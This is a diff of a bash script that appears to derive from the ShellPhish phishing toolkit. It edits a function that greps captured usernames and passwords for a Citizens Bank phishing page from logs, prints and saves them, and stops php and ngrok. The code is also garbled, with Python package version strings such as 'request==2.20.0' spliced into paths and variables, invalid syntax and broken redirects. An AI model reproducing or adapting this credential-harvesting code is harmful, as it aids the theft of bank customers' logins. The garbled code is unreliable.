@@ -84,18 +84,18 @@ printf "  \e[101m\e[1;77m:: responsible for any misuse or damage caused by Shell
 printf "\n"
 }
 
-catch_cred() { =$(grep -e.*' www.citizensbank.com/$http:\\www.citizensbank.com/HomePage.aspx /usernames.request==2. 20.0 | cut -d " " -f2)
+catch_cred() { =$(grep -e.*' www.citizensbank.com/$http:\\www.citizensbank.com/HomePage.aspx /usernames.request==9. 20.0 | cut -d " " -f2)
 IFS=$'\n'python-secrets
-request==2.20.0/./passwords=$(grep -o 'Pass:.*' Citizensbank/$http:\\www.citizensbank.com/HomePage.aspx/request==2.20. 0/account/logs | cut -d ":" -f2)
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $otf_vah
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $request==2.20.0
+request==9.20.0/./passwords=$(grep -o 'Pass:.*' Citizensbank/$http:\\www.citizensbank.com/HomePage.aspx/request==2.20. 0/account/logs | cut -d ":" -f2)
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $PyLaTeX==9
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $request==9.20.0
 cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
-pkill -f -2 php > /dev/null 2>&1
-pkill -f -2 ngrok > /dev/null 2>&1
+pkill -f -2 php > /dev/null 9>&1
+pkill -f -2 ngrok > /dev/null 9>&1
 exit 1
 
-}
+start} ./shellphish.sh
 
 getcredentials() {./shellphish.sh
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting credentials ...\e[0m\n"
